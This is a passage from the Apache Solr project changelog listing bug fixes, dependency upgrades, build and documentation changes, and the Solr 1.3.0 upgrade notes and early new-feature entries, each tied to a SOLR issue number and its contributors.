  42. [SOLR-929](http://issues.apache.org/jira/browse/SOLR-929): LukeRequestHandler should return "dynamicBase" only if the field is dynamic.

      (Peter Wolanin, koji)
  43. [SOLR-1141](http://issues.apache.org/jira/browse/SOLR-1141): NullPointerException during snapshoot command in java based replication

      (Jian Han Guo, shalin)
  44. [SOLR-1078](http://issues.apache.org/jira/browse/SOLR-1078): Fixes to WordDelimiterFilter to avoid splitting or dropping
      international non-letter characters such as non spacing marks.

      (yonik)
  45. [SOLR-825](http://issues.apache.org/jira/browse/SOLR-825), [SOLR-1221](http://issues.apache.org/jira/browse/SOLR-1221): Enables highlighting for range/wildcard/fuzzy/prefix queries if using hl.usePhraseHighlighter=true
      and hl.highlightMultiTerm=true. Also make both options default to true.

      (Mark Miller, yonik)
  46. [SOLR-1174](http://issues.apache.org/jira/browse/SOLR-1174): Fix Logging admin form submit url for multicore.

      (Jacob Singh via shalin)
  47. [SOLR-1182](http://issues.apache.org/jira/browse/SOLR-1182): Fix bug in OrdFieldSource#equals which could cause a bug with OrdFieldSource caching
      on OrdFieldSource#hashcode collisions.

      (Mark Miller)
  48. [SOLR-1207](http://issues.apache.org/jira/browse/SOLR-1207): equals method should compare this and other of DocList in DocSetBase

      (koji)
  49. [SOLR-1242](http://issues.apache.org/jira/browse/SOLR-1242): Human readable JVM info from system handler does integer cutoff rounding, even when dealing
      with GB. Fixed to round to one decimal place.

      (Jay Hill, Mark Miller)
  50. [SOLR-1243](http://issues.apache.org/jira/browse/SOLR-1243): Admin RequestHandlers should not be cached over HTTP.

      (Mark Miller)
  51. [SOLR-1260](http://issues.apache.org/jira/browse/SOLR-1260): Fix implementations of set operations for DocList subclasses
      and fix a bug in HashDocSet construction when offset != 0. These bugs
      never manifested in normal Solr use and only potentially affect
      custom code.

      (yonik)
  52. [SOLR-1171](http://issues.apache.org/jira/browse/SOLR-1171): Fix LukeRequestHandler so it doesn't rely on SolrQueryParser
      and report incorrect stats when field names contain characters
      SolrQueryParser considers special.

      (hossman)
  53. [SOLR-1317](http://issues.apache.org/jira/browse/SOLR-1317): Fix CapitalizationFilterFactory to work when keep parameter is not specified.

      (ehatcher)
  54. [SOLR-1342](http://issues.apache.org/jira/browse/SOLR-1342): CapitalizationFilterFactory uses incorrect term length calculations.

      (Robert Muir via Mark Miller)
  55. [SOLR-1359](http://issues.apache.org/jira/browse/SOLR-1359): DoubleMetaphoneFilter didn't index original tokens if there was no
      alternative, and could incorrectly skip or reorder tokens.

      (yonik)
  56. [SOLR-1360](http://issues.apache.org/jira/browse/SOLR-1360): Prevent PhoneticFilter from producing duplicate tokens.

      (yonik)
  57. [SOLR-1371](http://issues.apache.org/jira/browse/SOLR-1371): LukeRequestHandler/schema.jsp errored if schema had no
      uniqueKey field. The new test for this also (hopefully) adds some
      future proofing against similar bugs in the future. As a side
      effect QueryElevationComponentTest was refactored, and a bug in
      that test was found.

      (hossman)
  58. [SOLR-914](http://issues.apache.org/jira/browse/SOLR-914): General finalize() improvements. No finalizer delegates
      to the respective close/destroy method w/o first checking if it's
      already been closed/destroyed; if it hasn't a, SEVERE error is
      logged first.

      (noble, hossman)
  59. [SOLR-1362](http://issues.apache.org/jira/browse/SOLR-1362): WordDelimiterFilter had inconsistent behavior when setting
      the position increment of tokens following a token consisting of all
      delimiters, and could additionally lose big position increments.

      (Robert Muir, yonik)
  60. [SOLR-1091](http://issues.apache.org/jira/browse/SOLR-1091): Jetty's use of CESU-8 for code points outside the BMP
      resulted in invalid output from the serialized PHP writer.

      (yonik)
  61. [SOLR-1103](http://issues.apache.org/jira/browse/SOLR-1103): LukeRequestHandler (and schema.jsp) have been fixed to
      include the "1" (ie: 2\*\*0) bucket in the term histogram data.

      (hossman)
  62. [SOLR-1398](http://issues.apache.org/jira/browse/SOLR-1398): Add offset corrections in PatternTokenizerFactory.

      (Anders Melchiorsen, koji)
  63. [SOLR-1400](http://issues.apache.org/jira/browse/SOLR-1400): Properly handle zero-length tokens in TrimFilter. This
      was not a bug in any released version.

      (Peter Wolanin, gsingers)
  64. [SOLR-1071](http://issues.apache.org/jira/browse/SOLR-1071): spellcheck.extendedResults returns an invalid JSON response
      when count > 1. To fix, the extendedResults format was changed.

      (Uri Boness, yonik)
  65. [SOLR-1381](http://issues.apache.org/jira/browse/SOLR-1381): Fixed improper handling of fields that have only term positions and not term offsets during Highlighting

      (Thorsten Fischer, gsingers)
  66. [SOLR-1427](http://issues.apache.org/jira/browse/SOLR-1427): Fixed registry.jsp issue with MBeans

      (gsingers)
  67. [SOLR-1468](http://issues.apache.org/jira/browse/SOLR-1468): SolrJ's XML response parsing threw an exception for null
      names, such as those produced when facet.missing=true

      (yonik)
  68. [SOLR-1471](http://issues.apache.org/jira/browse/SOLR-1471): Fixed issue with calculating missing values for facets in single valued cases in Stats Component.
      This is not correctly calculated for the multivalued case.

      (James Miller, gsingers)
  69. [SOLR-1481](http://issues.apache.org/jira/browse/SOLR-1481): Fixed omitHeader parameter for PHP ResponseWriter.

      (Jun Ohtani via billa)
  70. [SOLR-1448](http://issues.apache.org/jira/browse/SOLR-1448): Add weblogic.xml to solr webapp to enable correct operation in
      WebLogic.

      (Ilan Rabinovitch via yonik)
  71. [SOLR-1504](http://issues.apache.org/jira/browse/SOLR-1504): empty char mapping can cause ArrayIndexOutOfBoundsException in analysis.jsp and co.

      (koji)
  72. [SOLR-1394](http://issues.apache.org/jira/browse/SOLR-1394): HTMLStripCharFilter split tokens that contained entities and
      often calculated offsets incorrectly for entities.

      (Anders Melchiorsen via yonik)
  73. [SOLR-1517](http://issues.apache.org/jira/browse/SOLR-1517): Admin pages could stall waiting for localhost name resolution
      if reverse DNS wasn't configured; this was changed so the DNS resolution
      is attempted only once the first time an admin page is loaded.

      (hossman)
  74. [SOLR-1529](http://issues.apache.org/jira/browse/SOLR-1529): More than 8 deleteByQuery commands in a single request
      caused an error to be returned, although the deletes were
      still executed.

      (asmodean via yonik)
  75. [SOLR-800](http://issues.apache.org/jira/browse/SOLR-800): Deep copy collections to avoid ConcurrentModificationException
      in XPathEntityprocessor while streaming

      (Kyle Morrison, Noble Paul via shalin)
  76. [SOLR-823](http://issues.apache.org/jira/browse/SOLR-823): Request parameter variables ${dataimporter.request.xxx} are not
      resolved in DIH

      (Mck SembWever, Noble Paul, shalin)
  77. [SOLR-728](http://issues.apache.org/jira/browse/SOLR-728): Add synchronization to avoid race condition of multiple DIH
      imports working concurrently

      (Walter Ferrara, shalin)
  78. [SOLR-742](http://issues.apache.org/jira/browse/SOLR-742): Add ability to create dynamic fields with custom
      DataImportHandler transformers

      (Wojtek Piaseczny, Noble Paul, shalin)
  79. [SOLR-832](http://issues.apache.org/jira/browse/SOLR-832): Rows parameter is not honored in DIH non-debug mode and can
      abort a running import in debug mode.

      (Akshay Ukey, shalin)
  80. [SOLR-838](http://issues.apache.org/jira/browse/SOLR-838): The DIH VariableResolver obtained from a DataSource's context
      does not have current data.

      (Noble Paul via shalin)
  81. [SOLR-864](http://issues.apache.org/jira/browse/SOLR-864): DataImportHandler does not catch and log Errors

      (shalin)
  82. [SOLR-873](http://issues.apache.org/jira/browse/SOLR-873): Fix case-sensitive field names and columns

      (Jon Baer, shalin)
  83. [SOLR-893](http://issues.apache.org/jira/browse/SOLR-893): Unable to delete documents via SQL and deletedPkQuery with
      deltaimport

      (Dan Rosher via shalin)
  84. [SOLR-888](http://issues.apache.org/jira/browse/SOLR-888): DIH DateFormatTransformer cannot convert non-string type

      (Amit Nithian via shalin)
  85. [SOLR-841](http://issues.apache.org/jira/browse/SOLR-841): DataImportHandler should throw exception if a field does not
      have column attribute

      (Michael Henson, shalin)
  86. [SOLR-884](http://issues.apache.org/jira/browse/SOLR-884): CachedSqlEntityProcessor should check if the cache key is
      present in the query results

      (Noble Paul via shalin)
  87. [SOLR-985](http://issues.apache.org/jira/browse/SOLR-985): Fix thread-safety issue with DIH TemplateString for concurrent
      imports with multiple cores.

      (Ryuuichi Kumai via shalin)
  88. [SOLR-999](http://issues.apache.org/jira/browse/SOLR-999): DIH XPathRecordReader fails on XMLs with nodes mixed with
      CDATA content.

      (Fergus McMenemie, Noble Paul via shalin)
  89. [SOLR-1000](http://issues.apache.org/jira/browse/SOLR-1000): DIH FileListEntityProcessor should not apply fileName filter to
      directory names.

      (Fergus McMenemie via shalin)
  90. [SOLR-1009](http://issues.apache.org/jira/browse/SOLR-1009): Repeated column names result in duplicate values.

      (Fergus McMenemie, Noble Paul via shalin)
  91. [SOLR-1017](http://issues.apache.org/jira/browse/SOLR-1017): Fix DIH thread-safety issue with last\_index\_time for concurrent
      imports in multiple cores due to unsafe usage of SimpleDateFormat by
      multiple threads.

      (Ryuuichi Kumai via shalin)
  92. [SOLR-1024](http://issues.apache.org/jira/browse/SOLR-1024): Calling abort on DataImportHandler import commits data instead
      of calling rollback.

      (shalin)
  93. [SOLR-1037](http://issues.apache.org/jira/browse/SOLR-1037): DIH should not add null values in a row returned by
      EntityProcessor to documents.

      (shalin)
  94. [SOLR-1040](http://issues.apache.org/jira/browse/SOLR-1040): DIH XPathEntityProcessor fails with an xpath like
      /feed/entry/link[@type='text/html']/@href

      (Noble Paul via shalin)
  95. [SOLR-1042](http://issues.apache.org/jira/browse/SOLR-1042): Fix memory leak in DIH by making TemplateString non-static
      member in VariableResolverImpl

      (Ryuuichi Kumai via shalin)
  96. [SOLR-1053](http://issues.apache.org/jira/browse/SOLR-1053): IndexOutOfBoundsException in DIH SolrWriter.getResourceAsString
      when size of data-config.xml is a multiple of 1024 bytes.

      (Herb Jiang via shalin)
  97. [SOLR-1077](http://issues.apache.org/jira/browse/SOLR-1077): IndexOutOfBoundsException with useSolrAddSchema in DIH
      XPathEntityProcessor.

      (Sam Keen, Noble Paul via shalin)
  98. [SOLR-1080](http://issues.apache.org/jira/browse/SOLR-1080): DIH RegexTransformer should not replace if regex is not matched.

      (Noble Paul, Fergus McMenemie via shalin)
  99. [SOLR-1090](http://issues.apache.org/jira/browse/SOLR-1090): DataImportHandler should load the data-config.xml using UTF-8
      encoding.

      (Rui Pereira, shalin)
  100. [SOLR-1146](http://issues.apache.org/jira/browse/SOLR-1146): ConcurrentModificationException in DataImporter.getStatusMessages

       (Walter Ferrara, Noble Paul via shalin)
  101. [SOLR-1229](http://issues.apache.org/jira/browse/SOLR-1229): Fixes for DIH deletedPkQuery, particularly when using
       transformed Solr unique id's

       (Lance Norskog, Noble Paul via ehatcher)
  102. [SOLR-1286](http://issues.apache.org/jira/browse/SOLR-1286): Fix the IH commit parameter always defaulting to "true" even
       if "false" is explicitly passed in.

       (Jay Hill, Noble Paul via ehatcher)
  103. [SOLR-1323](http://issues.apache.org/jira/browse/SOLR-1323): Reset XPathEntityProcessor's $hasMore/$nextUrl when fetching
       next URL

       (noble, ehatcher)
  104. [SOLR-1450](http://issues.apache.org/jira/browse/SOLR-1450): DIH: Jdbc connection properties such as batchSize are not
       applied if the driver jar is placed in solr\_home/lib.

       (Steve Sun via shalin)
  105. [SOLR-1474](http://issues.apache.org/jira/browse/SOLR-1474): DIH Delta-import should run even if last\_index\_time is not set.

       (shalin)
+ Other Changes   (64)
  1. Upgraded to Lucene 2.4.0

     (yonik)
  2. [SOLR-805](http://issues.apache.org/jira/browse/SOLR-805): Upgraded to Lucene 2.9-dev (r707499)

     (koji)
  3. DumpRequestHandler (/debug/dump): changed 'fieldName' to 'sourceInfo'.

     (ehatcher)
  4. [SOLR-852](http://issues.apache.org/jira/browse/SOLR-852): Refactored common code in CSVRequestHandler and XMLUpdateRequestHandler

     (gsingers, ehatcher)
  5. [SOLR-871](http://issues.apache.org/jira/browse/SOLR-871): Removed dependency on stax-utils.jar. If you using solr.jar and running
     java 6, you can also remove woodstox and geronimo.

     (ryan)
  6. [SOLR-465](http://issues.apache.org/jira/browse/SOLR-465): Upgraded to Lucene 2.9-dev (r719351)

     (shalin)
  7. [SOLR-889](http://issues.apache.org/jira/browse/SOLR-889): Upgraded to commons-io-1.4.jar and commons-fileupload-1.2.1.jar

     (ryan)
  8. [SOLR-875](http://issues.apache.org/jira/browse/SOLR-875): Upgraded to Lucene 2.9-dev (r723985) and consolidated the BitSet implementations

     (Michael Busch, gsingers)
  9. [SOLR-819](http://issues.apache.org/jira/browse/SOLR-819): Upgraded to Lucene 2.9-dev (r724059) to get access to Arabic public constructors

     (gsingers)
  10. [SOLR-900](http://issues.apache.org/jira/browse/SOLR-900): Moved solrj into /src/solrj. The contents of solr-common.jar is now included
      in the solr-solrj.jar.

      (ryan)
  11. [SOLR-924](http://issues.apache.org/jira/browse/SOLR-924): Code cleanup: make all existing finalize() methods call
      super.finalize() in a finally block. All current instances extend
      Object, so this doesn't fix any bugs, but helps protect against
      future changes.

      (Kay Kay via hossman)
  12. [SOLR-885](http://issues.apache.org/jira/browse/SOLR-885): NamedListCodec is renamed to JavaBinCodec and returns Object instead of NamedList.

      (Noble Paul, yonik via shalin)
  13. [SOLR-84](http://issues.apache.org/jira/browse/SOLR-84): Use new Solr logo in admin

      (Michiel via koji)
  14. [SOLR-981](http://issues.apache.org/jira/browse/SOLR-981): groupId for Woodstox dependency in maven solrj changed to org.codehaus.woodstox

      (Tim Taranov via shalin)
  15. Upgraded to Lucene 2.9-dev r738218

      (yonik)
  16. [SOLR-959](http://issues.apache.org/jira/browse/SOLR-959): Refactored TestReplicationHandler to remove hardcoded port numbers

      (hossman, Akshay Ukey via shalin)
  17. Upgraded to Lucene 2.9-dev r742220

      (yonik)
  18. [SOLR-1022](http://issues.apache.org/jira/browse/SOLR-1022): Better "ignored" field in example schema.xml

      (Peter Wolanin via hossman)
  19. [SOLR-967](http://issues.apache.org/jira/browse/SOLR-967): New type-safe constructor for NamedList

      (Kay Kay via hossman)
  20. [SOLR-1036](http://issues.apache.org/jira/browse/SOLR-1036): Change default QParser from "lucenePlusSort" to "lucene" to
      reduce confusion of semicolon splitting behavior when no sort param is
      specified

      (hossman)
  21. Upgraded to Lucene 2.9-dev r752164

      (shalin)
  22. [SOLR-1068](http://issues.apache.org/jira/browse/SOLR-1068): Use fsync on replicated index and configuration files

      (yonik, Noble Paul, shalin)
  23. [SOLR-952](http://issues.apache.org/jira/browse/SOLR-952): Cleanup duplicated code in deprecated HighlightingUtils

      (hossman)
  24. Upgraded to Lucene 2.9-dev r764281

      (shalin)
  25. [SOLR-1079](http://issues.apache.org/jira/browse/SOLR-1079): Rename omitTf to omitTermFreqAndPositions

      (shalin)
  26. [SOLR-804](http://issues.apache.org/jira/browse/SOLR-804): Added Lucene's misc contrib JAR (rev 764281).

      (gsingers)
  27. Upgraded to Lucene 2.9-dev r768228

      (shalin)
  28. Upgraded to Lucene 2.9-dev r768336

      (shalin)
  29. [SOLR-997](http://issues.apache.org/jira/browse/SOLR-997): Wait for a longer time for slave to complete replication in TestReplicationHandler

      (Mark Miller via shalin)
  30. [SOLR-748](http://issues.apache.org/jira/browse/SOLR-748): FacetComponent helper classes are made public as an experimental API.

      (Wojtek Piaseczny via shalin)
  31. Upgraded to Lucene 2.9-dev 773862

      (Mark Miller)
  32. Upgraded to Lucene 2.9-dev r776177

      (shalin)
  33. [SOLR-1149](http://issues.apache.org/jira/browse/SOLR-1149): Made QParserPlugin and related classes extendible as an experimental API.

      (Kaktu Chakarabati via shalin)
  34. Upgraded to Lucene 2.9-dev r779312

      (yonik)
  35. [SOLR-786](http://issues.apache.org/jira/browse/SOLR-786): Refactor DisMaxQParser to allow overriding certain features of DisMaxQParser

      (Wojciech Biela via shalin)
  36. [SOLR-458](http://issues.apache.org/jira/browse/SOLR-458): Add equals and hashCode methods to NamedList

      (Stefan Rinner, shalin)
  37. [SOLR-1184](http://issues.apache.org/jira/browse/SOLR-1184): Add option in solrconfig to open a new IndexReader rather than
      using reopen. Done mainly as a fail-safe in the case that a user runs into
      a reopen bug/issue.

      (Mark Miller)
  38. [SOLR-1215](http://issues.apache.org/jira/browse/SOLR-1215) use double quotes to enclose attributes in solr.xml

      (noble)
  39. [SOLR-1151](http://issues.apache.org/jira/browse/SOLR-1151): add dynamic copy field and maxChars example to example schema.xml.

      (Peter Wolanin, Mark Miller)
  40. [SOLR-1233](http://issues.apache.org/jira/browse/SOLR-1233): remove /select?qt=/whatever restriction on /-prefixed request handlers.

      (ehatcher)
  41. [SOLR-1257](http://issues.apache.org/jira/browse/SOLR-1257): logging.jsp has been removed and now passes through to the
      hierarchical log level tool added in Solr 1.3. Users still
      hitting "/admin/logging.jsp" should switch to "/admin/logging".

      (hossman)
  42. Upgraded to Lucene 2.9-dev r794238. Other changes include:
      - [LUCENE-1614](http://issues.apache.org/jira/browse/LUCENE-1614) - Use Lucene's DocIdSetIterator.NO\_MORE\_DOCS as the sentinel value.
      - [LUCENE-1630](http://issues.apache.org/jira/browse/LUCENE-1630) - Add acceptsDocsOutOfOrder method to Collector implementations.
      - [LUCENE-1673](http://issues.apache.org/jira/browse/LUCENE-1673), [LUCENE-1701](http://issues.apache.org/jira/browse/LUCENE-1701) - Trie has moved to Lucene core and renamed to NumericRangeQuery.
      - [LUCENE-1662](http://issues.apache.org/jira/browse/LUCENE-1662), [LUCENE-1687](http://issues.apache.org/jira/browse/LUCENE-1687) - Replace usage of ExtendedFieldCache by FieldCache.(shalin)
  43. [SOLR-1241](http://issues.apache.org/jira/browse/SOLR-1241): Solr's CharFilter has been moved to Lucene. Remove CharFilter and related classes
      from Solr and use Lucene's corresponding code

      (koji via shalin)
  44. [SOLR-1261](http://issues.apache.org/jira/browse/SOLR-1261): Lucene trunk renamed RangeQuery & Co to TermRangeQuery

      (Uwe Schindler via shalin)
  45. Upgraded to Lucene 2.9-dev r801856

      (Mark Miller)
  46. [SOLR-1276](http://issues.apache.org/jira/browse/SOLR-1276): Added StatsComponentTest

      (RafaÅ KuÄ, gsingers)
  47. [SOLR-1377](http://issues.apache.org/jira/browse/SOLR-1377): The TokenizerFactory API has changed to explicitly return a Tokenizer
      rather then a TokenStream (that may be or may not be a Tokenizer). This change
      is required to take advantage of the Token reuse improvements in lucene 2.9.

      (ryan)
  48. [SOLR-1410](http://issues.apache.org/jira/browse/SOLR-1410): Log a warning if the deprecated charset option is used
      on GreekLowerCaseFilterFactory, RussianStemFilterFactory,
      RussianLowerCaseFilterFactory or RussianLetterTokenizerFactory.

      (Robert Muir via hossman)
  49. [SOLR-1423](http://issues.apache.org/jira/browse/SOLR-1423): Due to [LUCENE-1906](http://issues.apache.org/jira/browse/LUCENE-1906), Solr's tokenizer should use Tokenizer.correctOffset() instead of CharStream.correctOffset().

      (Uwe Schindler via koji)
  50. [SOLR-1319](http://issues.apache.org/jira/browse/SOLR-1319), [SOLR-1345](http://issues.apache.org/jira/browse/SOLR-1345): Upgrade Solr Highlighter classes to new Lucene Highlighter API. This upgrade has
      resulted in a back compat break in the DefaultSolrHighlighter class - getQueryScorer is no longer
      protected. If you happened to be overriding that method in custom code, overide getHighlighter instead.
      Also, HighlightingUtils#getQueryScorer has been removed as it was deprecated and backcompat has been
      broken with it anyway.

      (Mark Miller)
  51. [SOLR-1357](http://issues.apache.org/jira/browse/SOLR-1357) SolrInputDocument cannot process dynamic fields

      (Lars Grote via noble)
  52. [SOLR-1075](http://issues.apache.org/jira/browse/SOLR-1075): Upgrade to Tika 0.3. See <http://www.apache.org/dist/lucene/tika/CHANGES-0.3.txt>

      (gsingers)
  53. [SOLR-1310](http://issues.apache.org/jira/browse/SOLR-1310): Upgrade to Tika 0.4. Note there are some differences in
      detecting Languages now in extracting request handler.
      See <http://www.lucidimagination.com/search/document/d6f1899a85b2a45c/vote_apache_tika_0_4_release_candidate_2#d6f1899a85b2a45c>
      for discussion on language detection.
      See <http://www.apache.org/dist/lucene/tika/CHANGES-0.4.txt.>

      (gsingers)
  54. [SOLR-782](http://issues.apache.org/jira/browse/SOLR-782): DIH: Refactored SolrWriter to make it a concrete class and
      removed wrappers over SolrInputDocument. Refactored to load Evaluators
      lazily. Removed multiple document nodes in the configuration xml. Removed
      support for 'default' variables, they are automatically available as
      request parameters.

      (Noble Paul via shalin)
  55. [SOLR-964](http://issues.apache.org/jira/browse/SOLR-964): DIH: XPathEntityProcessor now ignores DTD validations

      (Fergus McMenemie, Noble Paul via shalin)
  56. [SOLR-1029](http://issues.apache.org/jira/browse/SOLR-1029): DIH: Standardize Evaluator parameter parsing and added helper
      functions for parsing all evaluator parameters in a standard way.

      (Noble Paul, shalin)
  57. [SOLR-1081](http://issues.apache.org/jira/browse/SOLR-1081): Change DIH EventListener to be an interface so that components
      such as an EntityProcessor or a Transformer can act as an event listener.

      (Noble Paul, shalin)
  58. [SOLR-1027](http://issues.apache.org/jira/browse/SOLR-1027): DIH: Alias the 'dataimporter' namespace to a shorter name 'dih'.

      (Noble Paul via shalin)
  59. [SOLR-1084](http://issues.apache.org/jira/browse/SOLR-1084): Better error reporting when DIH entity name is a reserved word
      and data-config.xml root node is not <dataConfig>.

      (Noble Paul via shalin)
  60. [SOLR-1087](http://issues.apache.org/jira/browse/SOLR-1087): Deprecate 'where' attribute in CachedSqlEntityProcessor in
      favor of cacheKey and cacheLookup.

      (Noble Paul via shalin)
  61. [SOLR-969](http://issues.apache.org/jira/browse/SOLR-969): Change the FULL\_DUMP, DELTA\_DUMP, FIND\_DELTA constants in DIH
      Context to String. Change Context.currentProcess() to return a string
      instead of an integer.

      (Kay Kay, Noble Paul, shalin)
  62. [SOLR-1120](http://issues.apache.org/jira/browse/SOLR-1120): Simplified DIH EntityProcessor API by moving logic for applying
      transformers and handling multi-row outputs from Transformers into an
      EntityProcessorWrapper class. The behavior of the method
      EntityProcessor#destroy has been modified to be called once per parent-row
      at the end of row. A new method EntityProcessor#close is added which is
      called at the end of import. A new method
      Context#getResolvedEntityAttribute is added which returns the resolved
      value of an entity's attribute. Introduced a DocWrapper which takes care
      of maintaining document level session variables.

      (Noble Paul, shalin)
  63. [SOLR-1265](http://issues.apache.org/jira/browse/SOLR-1265): Add DIH variable resolving for URLDataSource properties like
      baseUrl.

      (Chris Eldredge via ehatcher)
  64. [SOLR-1269](http://issues.apache.org/jira/browse/SOLR-1269): Better error messages from DIH JdbcDataSource when JDBC Driver
      name or SQL is incorrect.

      (ehatcher, shalin)
+ Build   (6)
  1. [SOLR-776](http://issues.apache.org/jira/browse/SOLR-776): Added in ability to sign artifacts via Ant for releases

     (gsingers)
  2. [SOLR-854](http://issues.apache.org/jira/browse/SOLR-854): Added run-example target

     (Mark Miller via ehatcher)
  3. [SOLR-1054](http://issues.apache.org/jira/browse/SOLR-1054):Fix dist-src target for DataImportHandler

     (Ryuuichi Kumai via shalin)
  4. [SOLR-1219](http://issues.apache.org/jira/browse/SOLR-1219): Added proxy.setup target

     (koji)
  5. [SOLR-1386](http://issues.apache.org/jira/browse/SOLR-1386): In build.xml, use longfile="gnu" in tar task to avoid warnings about long file names

     (Mark Miller via shalin)
  6. [SOLR-1441](http://issues.apache.org/jira/browse/SOLR-1441): Make it possible to run all tests in a package

     (shalin)
+ Documentation   (4)
  1. [SOLR-789](http://issues.apache.org/jira/browse/SOLR-789): The javadoc of RandomSortField is not readable

     (Nicolas LalevÃ©e via koji)
  2. [SOLR-962](http://issues.apache.org/jira/browse/SOLR-962): Note about null handling in ModifiableSolrParams.add javadoc

     (Kay Kay via hossman)
  3. [SOLR-1409](http://issues.apache.org/jira/browse/SOLR-1409): Added Solr Powered By Logos
  4. [SOLR-1369](http://issues.apache.org/jira/browse/SOLR-1369): Add HSQLDB Jar to example-DIH, unzip database and update
     instructions.

### Release 1.3.0 [2008-09-16]

+ Upgrading from Solr 1.2   (8)
  1. IMPORTANT UPGRADE NOTE: In a master/slave configuration, all searchers/slaves
     should be upgraded before the master! If the master were to be updated
     first, the older searchers would not be able to read the new index format.
  2. The Porter snowball based stemmers in Lucene were updated ([LUCENE-1142](http://issues.apache.org/jira/browse/LUCENE-1142)),
     and are not guaranteed to be backward compatible at the index level
     (the stem of certain words may have changed). Re-indexing is recommended.
  3. Older Apache Solr installations can be upgraded by replacing
     the relevant war file with the new version. No changes to configuration
     files should be needed.
  4. This version of Solr contains a new version of Lucene implementing
     an updated index format. This version of Solr/Lucene can still read
     and update indexes in the older formats, and will convert them to the new
     format on the first index change. Be sure to backup your index before
     upgrading in case you need to downgrade.
  5. Solr now recognizes HTTP Request headers related to HTTP Caching (see
     RFC 2616 sec13) and will by default respond with "304 Not Modified"
     when appropriate. This should only affect users who access Solr via
     an HTTP Cache, or via a Web-browser that has an internal cache, but if
     you wish to suppress this behavior an '<httpCaching never304="true"/>'
     option can be added to your solrconfig.xml. See the wiki (or the
     example solrconfig.xml) for more details...
     <http://wiki.apache.org/solr/SolrConfigXml#HTTPCaching>
  6. In Solr 1.2, DateField did not enforce the canonical representation of
     the ISO 8601 format when parsing incoming data, and did not generation
     the canonical format when generating dates from "Date Math" strings
     (particularly as it pertains to milliseconds ending in trailing zeros).
     As a result equivalent dates could not always be compared properly.
     This problem is corrected in Solr 1.3, but DateField users that might
     have been affected by indexing inconsistent formats of equivilent
     dates (ie: 1995-12-31T23:59:59Z vs 1995-12-31T23:59:59.000Z) may want
     to consider reindexing to correct these inconsistencies. Users who
     depend on some of the the "broken" behavior of DateField in Solr 1.2
     (specificly: accepting any input that ends in a 'Z') should consider
     using the LegacyDateField class as a possible alternative. Users that
     desire 100% backwards compatibility should consider using the Solr 1.2
     version of DateField.
  7. Due to some changes in the lifecycle of TokenFilterFactories, users of
     Solr 1.2 who have written Java code which constructs new instances of
     StopFilterFactory, SynonymFilterFactory, or EnglishProterFilterFactory
     will need to modify their code by adding a line like the following
     prior to using the factory object...
     factory.inform(SolrCore.getSolrCore().getSolrConfig().getResourceLoader());
     These lifecycle changes do not affect people who use Solr "out of the
     box" or who have developed their own TokenFilterFactory plugins. More
     info can be found in [SOLR-594](http://issues.apache.org/jira/browse/SOLR-594).
  8. The python client that used to ship with Solr is no longer included in
     the distribution (see client/python/README.txt).
#### Detailed Change List

+ New Features   (73)
  1. [SOLR-69](http://issues.apache.org/jira/browse/SOLR-69): Adding MoreLikeThisHandler to search for similar documents using
     lucene contrib/queries MoreLikeThis. MoreLikeThis is also available from
     the StandardRequestHandler using ?mlt=true.

     (bdelacretaz, ryan)
  2. [SOLR-253](http://issues.apache.org/jira/browse/SOLR-253): Adding KeepWordFilter and KeepWordFilterFactory. A TokenFilter
     that keeps tokens with text in the registered keeplist. This behaves like
     the inverse of StopFilter.

     (ryan)
  3. [SOLR-257](http://issues.apache.org/jira/browse/SOLR-257): WordDelimiterFilter has a new parameter splitOnCaseChange,
     which can be set to 0 to disable splitting "PowerShot" => "Power" "Shot".

     (klaas)
  4. [SOLR-193](http://issues.apache.org/jira/browse/SOLR-193): Adding SolrDocument and SolrInputDocument to represent documents
     outside of the lucene Document infrastructure. This class will be used
     by clients and for processing documents.

     (ryan)
  5. [SOLR-244](http://issues.apache.org/jira/browse/SOLR-244): Added ModifiableSolrParams - a SolrParams implementation that
     help you change values after initialization.

     (ryan)
  6. [SOLR-20](http://issues.apache.org/jira/browse/SOLR-20): Added a java client interface with two implementations. One
     implementation uses commons httpclient to connect to solr via HTTP. The
     other connects to solr directly. Check client/java/solrj. This addition
     also includes tests that start jetty and test a connection using the full
     HTTP request cycle.

     (Darren Erik Vengroff, Will Johnson, ryan)
  7. [SOLR-133](http://issues.apache.org/jira/browse/SOLR-133): Added StaxUpdateRequestHandler that uses StAX for XML parsing.
     This implementation has much better error checking and lets you configure
     a custom UpdateRequestProcessor that can selectively process update
     requests depending on the request attributes. This class will likely
     replace XmlUpdateRequestHandler.

     (Thorsten Scherler, ryan)
  8. [SOLR-264](http://issues.apache.org/jira/browse/SOLR-264): Added RandomSortField, a utility field with a random sort order.
     The seed is based on a hash of the field name, so a dynamic field
     of this type is useful for generating different random sequences.
     This field type should only be used for sorting or as a value source
     in a FunctionQuery

     (ryan, hossman, yonik)
  9. [SOLR-266](http://issues.apache.org/jira/browse/SOLR-266): Adding show=schema to LukeRequestHandler to show the parsed
     schema fields and field types.

     (ryan)
  10. [SOLR-133](http://issues.apache.org/jira/browse/SOLR-133): The UpdateRequestHandler now accepts multiple delete options
      within a single request. For example, sending:
      <delete><id>1</id><id>2</id></delete> will delete both 1 and 2.

      (ryan)
  11. [SOLR-269](http://issues.apache.org/jira/browse/SOLR-269): Added UpdateRequestProcessor plugin framework. This provides
      a reasonable place to process documents after they are parsed and
      before they are committed to the index. This is a good place for custom
      document manipulation or document based authorization.

      (yonik, ryan)
  12. [SOLR-260](http://issues.apache.org/jira/browse/SOLR-260): Converting to a standard PluginLoader framework. This reworks
      RequestHandlers, FieldTypes, and QueryResponseWriters to share the same
      base code for loading and initializing plugins. This adds a new
      configuration option to define the default RequestHandler and
      QueryResponseWriter in XML using default="true".

      (ryan)
  13. [SOLR-225](http://issues.apache.org/jira/browse/SOLR-225): Enable pluggable highlighting classes. Allow configurable
      highlighting formatters and Fragmenters.

      (ryan)
  14. [SOLR-273](http://issues.apache.org/jira/browse/SOLR-273)/376/452/516: Added hl.maxAnalyzedChars highlighting parameter, defaulting
      to 50k, hl.alternateField, which allows the specification of a backup
      field to use as summary if no keywords are matched, and hl.mergeContiguous,
      which combines fragments if they are adjacent in the source document.

      (klaas, Grant Ingersoll, Koji Sekiguchi via klaas)
  15. [SOLR-291](http://issues.apache.org/jira/browse/SOLR-291): Control maximum number of documents to cache for any entry
      in the queryResultCache via queryResultMaxDocsCached solrconfig.xml
      entry.

      (Koji Sekiguchi via yonik)
  16. [SOLR-240](http://issues.apache.org/jira/browse/SOLR-240): New <lockType> configuration setting in <mainIndex> and
      <indexDefaults> blocks supports all Lucene builtin LockFactories.
      'single' is recommended setting, but 'simple' is default for total
      backwards compatibility.

      (Will Johnson via hossman)
